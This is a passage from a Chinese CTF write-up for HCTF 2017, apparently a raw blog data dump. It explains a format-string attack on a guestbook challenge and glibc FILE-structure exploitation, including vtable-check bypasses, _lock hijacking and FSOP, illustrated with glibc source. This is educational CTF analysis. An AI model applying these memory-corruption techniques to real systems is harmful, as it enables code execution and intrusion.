handle\\n\");\n}\n```\n\n主要检查了三种情况，如果这三种情况都不满足的话，那么就说明vtable已经被改变过了。\n\n我们看到两个地方可以通过检查\n\n![](7.png)\n\n第一个地方因为有指针检查所以很难bypass\n第二处需要我们overwrite`_dl_open_hook`，这个指针是一个有三个函数的结构体\n\n```\n/* This code is to support __libc_dlopen from __libc_dlopen'ed shared\n   libraries.  We need to ensure the statically linked __libc_dlopen\n   etc. functions are used instead of the dynamically loaded.  */\nstruct dl_open_hook\n{\n  void *(*dlopen_mode) (const char *name, int mode);\n  void *(*dlsym) (void *map, const char *name);\n  int (*dlclose) (void *map);\n};\n```\n\n#### exp 0x00\n\n档不能伪造vtable的时候，发现可以直接使用原先_vtable_jmp的函数``JUMP_INIT(overflow, _IO_str_overflow)\n\n```\nconst struct _IO_jump_t _IO_str_jumps libio_vtable =\n{\n  JUMP_INIT_DUMMY,\n  JUMP_INIT(finish, _IO_str_finish),\n  JUMP_INIT(overflow, _IO_str_overflow),\n  JUMP_INIT(underflow, _IO_str_underflow),\n  JUMP_INIT(uflow, _IO_default_uflow),\n  JUMP_INIT(pbackfail, _IO_str_pbackfail),\n  JUMP_INIT(xsputn, _IO_default_xsputn),\n  JUMP_INIT(xsgetn, _IO_default_xsgetn),\n  JUMP_INIT(seekoff, _IO_str_seekoff),\n  JUMP_INIT(seekpos, _IO_default_seekpos),\n  JUMP_INIT(setbuf, _IO_default_setbuf),\n  JUMP_INIT(sync, _IO_default_sync),\n  JUMP_INIT(doallocate, _IO_default_doallocate),\n  JUMP_INIT(read, _IO_default_read),\n  JUMP_INIT(write, _IO_default_write),\n  JUMP_INIT(seek, _IO_default_seek),\n  JUMP_INIT(close, _IO_default_close),\n  JUMP_INIT(stat, _IO_default_stat),\n  JUMP_INIT(showmanyc, _IO_default_showmanyc),\n  JUMP_INIT(imbue, _IO_default_imbue)\n};\n```\n\n这个`_IO_str_overflow`的源码中有`new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);`这样一句，由于我们是可以控制`fp`的，所以我们伪造`fp->_s._allocate_buffer`这个偏移的函数即可控制一次rip。\n\n```\nint\n_IO_str_overflow (_IO_FILE *fp, int c)\n{\n  int flush_only = c == EOF;\n  _IO_size_t pos;\n  if (fp->_flags & _IO_NO_WRITES)\n      return flush_only ? 0 : EOF;\n  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))\n    {\n      fp->_flags |= _IO_CURRENTLY_PUTTING;\n      fp->_IO_write_ptr = fp->_IO_read_ptr;\n      fp->_IO_read_ptr = fp->_IO_read_end;\n    }\n  pos = fp->_IO_write_ptr - fp->_IO_write_base;\n  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))\n    {\n      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */\n        return EOF;\n      else\n        {\n          char *new_buf;\n          char *old_buf = fp->_IO_buf_base;\n          size_t old_blen = _IO_blen (fp);\n          _IO_size_t new_size = 2 * old_blen + 100;\n          if (new_size < old_blen)\n            return EOF;\n          new_buf\n            = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);\n          if (new_buf == NULL)\n            {\n              /*          __ferror(fp) = 1; */\n              return EOF;\n            }\n          if (old_buf)\n            {\n              memcpy (new_buf, old_buf, old_blen);\n              (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);\n              /* Make sure _IO_setb won't try to delete _IO_buf_base. */\n              fp->_IO_buf_base = NULL;\n            }\n          memset (new_buf + old_blen, '\\0', new_size - old_blen);\n \n          _IO_setb (fp, new_buf, new_buf + new_size, 1);\n          fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);\n          fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);\n          fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);\n          fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);\n \n          fp->_IO_write_base = new_buf;\n          fp->_IO_write_end = fp->_IO_buf_end;\n        }\n    }\n \n  if (!flush_only)\n    *fp->_IO_write_ptr++ = (unsigned char) c;\n  if (fp->_IO_write_ptr > fp->_IO_read_end)\n    fp->_IO_read_end = fp->_IO_write_ptr;\n  return c;\n}\nlibc_hidden_def (_IO_str_overflow)\n```\n\n#### exp 0x01\n\n再看下`dl_open_hook`这个指针，似乎是在有其他hook_so的时候使用的，在检查`_dl_open_hook`是否为空之后，会进行`_vtable_check`然后调用`dlopen_mode`这个函数指针处，这个结构体我们可以伪造，接着就得到一次控制rip的机会。\n\n#### exp 0x02\n\n@angelboy下面提供了一种思路，通过`_fileno`和`_IO_buffer`来进行任意地址读写，原理也容易理解，当我们可以控制`_IO_buffer`的指针时，就可以适当的设置缓冲区地址到我们的目标地址即可。\n\n+ Arbitrary memory reading\n\t+ ![](9.png)\n+ Arbitrary memory writing\n\t+ ![](8.png)\n\n#### exp 0x03\n\n以及whctf那种利用unsortbins attack（main_arena）的（因为libc中stdin下面就是main_arena，可以一直覆盖到，只需要将`_IO_buf_end`改写到后面即可）\n\n#### exp 0x04\n\n利用`_IO_lock_t *_lock`这个结构来控制rip。\n\n```\ntypedef struct { int lock; int cnt; void *owner; } _IO_lock_t;\n.....\n.....\nstruct _IO_FILE {\n......\n  _IO_lock_t *_lock;\n.....\n};\n```\n这个是2.24的版本，直接控制这个结构体的指针即可。\n其调用的源码是\n\n```\nint\n_IO_new_fclose (_IO_FILE *fp)\n{\n...\n  _IO_acquire_lock (fp);\n  if (fp->_IO_file_flags & _IO_IS_FILEBUF)\n    status = _IO_file_close_it (fp);\n}\n```\n我们把这个`_lock`结构体指向一个可以控制的地方，rip就会跳到`call *(_lock+0x10)`，可以控制rip。\n\n#### exp 0x05 FSOP\n\nFSOP\n\n这个主要就是利用`chain`这个字段，档我们调用\n\n+ Glibc abort routine\n+ exit\n+ main return\n\n时，`_IO_flush_all_lockp`就会被调用，然后fflush all stream\n\n```\nint\n_IO_flush_all_lockp (int do_lock)\n{\n  int result = 0;\n  struct _IO_FILE *fp;\n \n#ifdef _IO_MTSAFE_IO\n  _IO_cleanup_region_start_noarg (flush_cleanup);\n  _IO_lock_lock (list_all_lock);\n#endif\n \n  for (fp = (_IO_FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)\n    {\n      run_fp = fp;\n      if (do_lock)\n        _IO_flockfile (fp);\n \n      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)\n           || (_IO_vtable_offset (fp) == 0\n               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr\n                                    > fp->_wide_data->_IO_write_base))\n           )\n          && _IO_OVERFLOW (fp, EOF) == EOF)     // Trigger virtual funcation\n...\n \n  return result;\n}\n```\n\n当我们修改`chain`的时候，将其控制到我们可写的一个地方，然后可以选择0x00的方法直接getshell，也可以选择两个或多个`FILE`结构体来完成rop（但是感觉好鸡肋，要没有_vtable_check，而且在可以控制一次rip的情况下可以跳到很多地方去）\n\n## level 3\n\n## level 4\n\n## level 5","slug":"2017HCTF赛后整理","published":1,"updated":"2017-12-03T15:04:19.101Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jx60007hv18zf84idtj","content":"<h2 id=\"level-1\"><a href=\"#level-1\" class=\"headerlink\" title=\"level 1\"></a>level 1</h2><h3 id=\"Evr-Q\"><a href=\"#Evr-Q\" class=\"headerlink\" title=\"Evr_Q\"></a>Evr_Q</h3><p>一个基本的逆向，但是有点麻烦。。<br>参考资料:<br><a href=\"https://bbs.pediy.com/thread-70470.htm\" target=\"_blank\" rel=\"external\">反调试技巧总结-原理和实现(1)(2)(3)(4)(5)(6)……</a><br><a href=\"http://www.cppblog.com/xunbu7/archive/2013/01/05/196963.html\" target=\"_blank\" rel=\"external\">反调试技巧总结-原理和实现</a><br><a href=\"https://bbs.pediy.com/thread-159935.htm\" target=\"_blank\" rel=\"external\">简单解释Windows如何使用FS段寄存器</a><br><a href=\"https://www.cnblogs.com/dliv3/p/6411814.html\" target=\"_blank\" rel=\"external\">PE中的aslr</a><br><a href=\"https://www.cnblogs.com/dliv3/p/6489629.html\" target=\"_blank\" rel=\"external\">TLS回调函数</a><br><a href=\"http://blog.csdn.net/fengyunzhongwei/article/details/29382945\" target=\"_blank\" rel=\"external\">一种基于TLS的高级反调试技术</a></p>\n<h2 id=\"level-2\"><a href=\"#level-2\" class=\"headerlink\" title=\"level 2\"></a>level 2</h2><h3 id=\"guestbook\"><a href=\"#guestbook\" class=\"headerlink\" title=\"guestbook\"></a>guestbook</h3><p>格式化字符串可解决，但是我在<code>(*_ctype_b_loc())[*(phonePtr_3064[10 * v1] + j)] &amp; 0x400 )</code>上卡了很久，后来搜索才知道是<code>__isctype</code>的宏展开。</p>\n<figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"># include &lt;endian.h&gt;</div><div class=\"line\"># <span class=\"keyword\">if</span> __BYTE_ORDER == __BIG_ENDIAN</div><div class=\"line\">#  define _ISbit(bit)\t(<span class=\"number\">1</span> &lt;&lt; (bit))</div><div class=\"line\"># else <span class=\"comment\">/* __BYTE_ORDER == __LITTLE_ENDIAN */</span></div><div class=\"line\">#  define _ISbit(bit)\t((bit) &lt; <span class=\"number\">8</span> ? ((<span class=\"number\">1</span> &lt;&lt; (bit)) &lt;&lt; <span class=\"number\">8</span>) : ((<span class=\"number\">1</span> &lt;&lt; (bit)) &gt;&gt; <span class=\"number\">8</span>))</div><div class=\"line\"># endif</div><div class=\"line\"></div><div class=\"line\">enum</div><div class=\"line\">&#123;</div><div class=\"line\">  _ISupper = _ISbit (<span class=\"number\">0</span>),\t<span class=\"comment\">/* UPPERCASE.  */</span></div><div class=\"line\">  _ISlower = _ISbit (<span class=\"number\">1</span>),\t<span class=\"comment\">/* lowercase.  */</span></div><div class=\"line\">  _ISalpha = _ISbit (<span class=\"number\">2</span>),\t<span class=\"comment\">/* Alphabetic.  */</span></div><div class=\"line\">  _ISdigit = _ISbit (<span class=\"number\">3</span>),\t<span class=\"comment\">/* Numeric.  */</span></div><div class=\"line\">  _ISxdigit = _ISbit (<span class=\"number\">4</span>),\t<span class=\"comment\">/* Hexadecimal numeric.  */</span></div><div class=\"line\">  _ISspace = _ISbit (<span class=\"number\">5</span>),\t<span class=\"comment\">/* Whitespace.  */</span></div><div class=\"line\">  _ISprint = _ISbit (<span class=\"number\">6</span>),\t<span class=\"comment\">/* Printing.  */</span></div><div class=\"line\">  _ISgraph = _ISbit (<span class=\"number\">7</span>),\t<span class=\"comment\">/* Graphical.  */</span></div><div class=\"line\">  _ISblank = _ISbit (<span class=\"number\">8</span>),\t<span class=\"comment\">/* Blank (usually SPC and TAB).  */</span></div><div class=\"line\">  _IScntrl = _ISbit (<span class=\"number\">9</span>),\t<span class=\"comment\">/* Control character.  */</span></div><div class=\"line\">  _ISpunct = _ISbit (<span class=\"number\">10</span>),\t<span class=\"comment\">/* Punctuation.  */</span></div><div class=\"line\">  _ISalnum = _ISbit (<span class=\"number\">11</span>)\t<span class=\"comment\">/* Alphanumeric.  */</span></div><div class=\"line\">&#125;;</div><div class=\"line\">..........</div><div class=\"line\">..........</div><div class=\"line\"># define __isctype(c, type) \\</div><div class=\"line\">  ((*__ctype_b_loc ())[(int) (c)] &amp; (unsigned short int) type)</div></pre></td></tr></table></figure>\n<p>后来我把对应的16进制打印了一下<br><figure class=\"highlight tap\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#include &lt;stdio.h&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;ctype.h&gt;</span></div><div class=\"line\"></div><div class=\"line\">int main()</div><div class=\"line\">&#123;</div><div class=\"line\">\tfor(int i = 0; i &lt; 12; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tprintf(\"%-4d, %04x\\n\", i, _ISbit(i));</div><div class=\"line\">\t\t/*</div><div class=\"line\">\t\t *<span class=\"number\"> 0 </span>  , 0100</div><div class=\"line\">\t\t *<span class=\"number\"> 1 </span>  , 0200</div><div class=\"line\">\t\t *<span class=\"number\"> 2 </span>  , 0400</div><div class=\"line\">\t\t *<span class=\"number\"> 3 </span>  , 0800</div><div class=\"line\">\t\t *<span class=\"number\"> 4 </span>  , 1000</div><div class=\"line\">\t\t *<span class=\"number\"> 5 </span>  , 2000</div><div class=\"line\">\t\t *<span class=\"number\"> 6 </span>  , 4000</div><div class=\"line\">\t\t *<span class=\"number\"> 7 </span>  , 8000</div><div class=\"line\">\t\t *<span class=\"number\"> 8 </span>  , 0001</div><div class=\"line\">\t\t *<span class=\"number\"> 9 </span>  , 0002</div><div class=\"line\">\t\t *<span class=\"number\"> 10 </span> , 0004</div><div class=\"line\">\t\t *<span class=\"number\"> 11 </span> , 0008</div><div class=\"line\">\t\t * /</div><div class=\"line\">\t&#125;</div><div class=\"line\">\treturn 0;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>所以程序中的代码就是检查是否是字母或whitespace。</p>\n<figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">for <span class=\"comment\">( j = 0; j &lt;= 15; ++j )</span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">if</span> <span class=\"comment\">( (*_ctype_b_loc()</span>)[*<span class=\"comment\">(phonePtr_3064[10 * v1] + j)</span>] &amp; <span class=\"number\">0</span>x<span class=\"number\">400</span> )<span class=\"comment\">// Alphabetic</span></div><div class=\"line\">  &#123;</div><div class=\"line\">    puts<span class=\"comment\">(\"I dont trust your phone number!\")</span>;</div><div class=\"line\">    <span class=\"keyword\">goto</span> LABEL_<span class=\"number\">11</span>;</div><div class=\"line\">  &#125;</div><div class=\"line\">  <span class=\"keyword\">if</span> <span class=\"comment\">( (*_ctype_b_loc()</span>)[*<span class=\"comment\">(phonePtr_3064[10 * v1] + j)</span>] &amp; <span class=\"number\">0</span>x<span class=\"number\">2000</span> )<span class=\"comment\">// Whitespace</span></div><div class=\"line\">  &#123;</div><div class=\"line\">    puts<span class=\"comment\">(\"I dont trust your phone number!\")</span>;</div><div class=\"line\">    <span class=\"keyword\">goto</span> LABEL_<span class=\"number\">11</span>;</div><div class=\"line\">  &#125;</div></pre></td></tr></table></figure>\n<p>所以先泄露elf基址和canary，然后改<code>__free_hook</code>到一个可以构造栈溢出的地方即可。</p>\n<p><strong>看了一下wp，<code>system(&quot;$0&quot;)</code>也能拿到shell</strong>，还不道为什么，环境变量？</p>\n<a id=\"more\"></a>\n<h3 id=\"babyprintf\"><a href=\"#babyprintf\" class=\"headerlink\" title=\"babyprintf\"></a>babyprintf</h3><p>先简单理解一下<code>FILE</code>结构体，参看了这篇<a href=\"https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique\" target=\"_blank\" rel=\"external\">slide</a><br><code>File stream</code>结构体可以看作<code>read</code>和<code>write</code>的一个封装，<code>FILE</code>结构体是<code>File stream</code>的一个主要结构体，其内部实现了一个流输入输出的缓冲区，用以减少系统调用的次数。</p>\n<figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div></pre></td><td class=\"code\"><pre><div class=\"line\">struct <span class=\"variable\">_IO_FILE</span> &#123;</div><div class=\"line\">  int <span class=\"variable\">_flags</span>;                <span class=\"comment\">/* High-order word is _IO_MAGIC; rest is flags. */</span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> _IO_file_flags _flags</span></div><div class=\"line\"> </div><div class=\"line\">  <span class=\"comment\">/* The following pointers correspond to the C++ streambuf protocol. */</span></div><div class=\"line\">  <span class=\"comment\">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_read_ptr</span>;        <span class=\"comment\">/* Current read pointer */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_read_end</span>;        <span class=\"comment\">/* End of get area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_read_base</span>;        <span class=\"comment\">/* Start of putback+get area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_write_base</span>;        <span class=\"comment\">/* Start of put area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_write_ptr</span>;        <span class=\"comment\">/* Current put pointer. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_write_end</span>;        <span class=\"comment\">/* End of put area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_buf_base</span>;        <span class=\"comment\">/* Start of reserve area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_buf_end</span>;        <span class=\"comment\">/* End of reserve area. */</span></div><div class=\"line\">  <span class=\"comment\">/* The following fields are used to support backing up and undo. */</span></div><div class=\"line\">  char *<span class=\"variable\">_IO_save_base</span>; <span class=\"comment\">/* Pointer to start of non-current get area. */</span></div><div class=\"line\">  char *<span class=\"variable\">_IO_backup_base</span>;  <span class=\"comment\">/* Pointer to first valid character of backup area */</span></div><div class=\"line\">  char *<span class=\"variable\">_IO_save_end</span>; <span class=\"comment\">/* Pointer to end of non-current get area. */</span></div><div class=\"line\"> </div><div class=\"line\">  struct <span class=\"variable\">_IO_marker</span> *<span class=\"variable\">_markers</span>;</div><div class=\"line\"> </div><div class=\"line\">  struct <span class=\"variable\">_IO_FILE</span> *<span class=\"variable\">_chain</span>;</div><div class=\"line\"> </div><div class=\"line\">  int <span class=\"variable\">_fileno</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> 0</span></div><div class=\"line\">  int <span class=\"variable\">_blksize</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></div><div class=\"line\">  int <span class=\"variable\">_flags2</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\">  <span class=\"variable\">_IO_off_t</span> <span class=\"variable\">_old_offset</span>; <span class=\"comment\">/* This used to be _offset but it's too small.  */</span></div><div class=\"line\"> </div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __HAVE_COLUMN <span class=\"comment\">/* temporary */</span></span></div><div class=\"line\">  <span class=\"comment\">/* 1+column number of pbase(); 0 is unknown. */</span></div><div class=\"line\">  unsigned short <span class=\"variable\">_cur_column</span>;</div><div class=\"line\">  signed char <span class=\"variable\">_vtable_offset</span>;</div><div class=\"line\">  char <span class=\"variable\">_shortbuf</span>[<span class=\"number\">1</span>];</div><div class=\"line\"> </div><div class=\"line\">  <span class=\"comment\">/*  char* _save_gptr;  char* _save_egptr; */</span></div><div class=\"line\"> </div><div class=\"line\">  <span class=\"variable\">_IO_lock_t</span> *<span class=\"variable\">_lock</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> _IO_USE_OLD_IO_FILE</span></div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure>\n<p>这里的几个buffer需要注意一下，这里就是我们的<code>FILE_buffer</code>的地址。<br>还有个<code>FILE_plus</code>的结构体，包含了一个虚表</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* We always allocate an extra word following an _IO_FILE.</span></div><div class=\"line\">   This contains a pointer to the function jump table used.</div><div class=\"line\">   This is for compatibility with C++ streambuf; the word can</div><div class=\"line\">   be used to smash to a pointer to a virtual function table. */</div><div class=\"line\"> </div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">_IO_FILE_plus</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  _IO_FILE file;</div><div class=\"line\">  <span class=\"keyword\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">_IO_jump_t</span></span> *vtable;</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure>\n<ul>\n<li><p>Flags</p>\n<ul>\n<li>文件的flag标志位，指示了file流的打开方式</li>\n</ul>\n</li>\n<li><p>_fileno</p>\n<ul>\n<li>文件描述符</li>\n<li>由<code>sys_open</code>函数返回</li>\n</ul>\n</li>\n<li><p>FILE plus</p>\n<ul>\n<li>任何的操作都是通过这个表</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div></pre></td><td class=\"code\"><pre><div class=\"line\">struct _IO_jump_t</div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(size_t, </span>__dummy)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(size_t, </span>__dummy2)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_finish_t, </span>__finish)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_overflow_t, </span>__overflow)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_underflow_t, </span>__underflow)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_underflow_t, </span>__uflow)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_pbackfail_t, </span>__pbackfail)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"comment\">/* showmany */</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_xsputn_t, </span>__xsputn)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_xsgetn_t, </span>__xsgetn)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_seekoff_t, </span>__seekoff)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_seekpos_t, </span>__seekpos)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_setbuf_t, </span>__setbuf)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_sync_t, </span>__sync)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_doallocate_t, </span>__doallocate)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_read_t, </span>__read)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_write_t, </span>__write)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_seek_t, </span>__seek)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_close_t, </span>__close)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_stat_t, </span>__stat)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_showmanyc_t, </span>__showmanyc)<span class=\"comment\">;</span></div><div class=\"line\">    <span class=\"keyword\">JUMP_FIELD(_IO_imbue_t, </span>__imbue)<span class=\"comment\">;</span></div><div class=\"line\"><span class=\"comment\">#if 0</span></div><div class=\"line\">    get_column<span class=\"comment\">;</span></div><div class=\"line\">    set_column<span class=\"comment\">;</span></div><div class=\"line\"><span class=\"comment\">#endif</span></div><div class=\"line\">&#125;<span class=\"comment\">;</span></div></pre></td></tr></table></figure>\n<ul>\n<li><code>struct _IO_FILE *_chain</code><ul>\n<li>所有的<code>FILE</code>结构体都是通过一个单项链表连接起来的</li>\n<li><img src=\"/2017/11/13/2017HCTF赛后整理/1.png\" alt=\"\"></li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight haxe\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div></pre></td><td class=\"code\"><pre><div class=\"line\">_IO_FILE *</div><div class=\"line\">__fopen_internal (const char *filename, const char *mode, int is32)</div><div class=\"line\">&#123;</div><div class=\"line\">  struct locked_FILE</div><div class=\"line\">  &#123;</div><div class=\"line\">    struct _IO_FILE_plus fp;</div><div class=\"line\"><span class=\"meta\">#ifdef _IO_MTSAFE_IO</span></div><div class=\"line\">    _IO_lock_t lock;</div><div class=\"line\"><span class=\"meta\">#endif</span></div><div class=\"line\">    struct _IO_wide_data wd;</div><div class=\"line\">  &#125; *<span class=\"keyword\">new</span><span class=\"type\">_f</span> = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));</div><div class=\"line\"> </div><div class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"keyword\">new</span><span class=\"type\">_f</span> == NULL)</div><div class=\"line\">    <span class=\"keyword\">return</span> NULL;</div><div class=\"line\"><span class=\"meta\">#ifdef _IO_MTSAFE_IO</span></div><div class=\"line\">  <span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;fp.file._lock = &amp;<span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;lock;</div><div class=\"line\"><span class=\"meta\">#endif</span></div><div class=\"line\">  _IO_no_init (&amp;<span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;fp.file, <span class=\"number\">0</span>, <span class=\"number\">0</span>, &amp;<span class=\"keyword\">new</span><span class=\"type\">_f</span>-&gt;wd, &amp;_IO_wfile_jumps);</div><div class=\"line\">  _IO_JUMPS 